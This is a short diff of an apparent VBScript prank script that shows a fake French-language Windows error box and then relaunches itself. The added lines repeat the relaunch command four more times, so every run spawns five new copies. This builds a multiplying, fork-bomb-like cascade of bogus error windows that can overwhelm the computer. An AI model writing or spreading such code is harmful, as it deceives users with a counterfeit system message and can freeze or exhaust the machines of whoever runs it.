@@ -18,4 +18,8 @@ box1 = MsgBox("Windows a rencontre un probleme. Pour resoudre le probleme, cliqu
         WScript.Sleep(2000)
         commanderestartp = nameofprog
         CreateObject("wscript.shell").run """" + commanderestartp + """",1,False
+        CreateObject("wscript.shell").run """" + commanderestartp + """",1,False
+        CreateObject("wscript.shell").run """" + commanderestartp + """",1,False
+        CreateObject("wscript.shell").run """" + commanderestartp + """",1,False
+        CreateObject("wscript.shell").run """" + commanderestartp + """",1,False
     End If
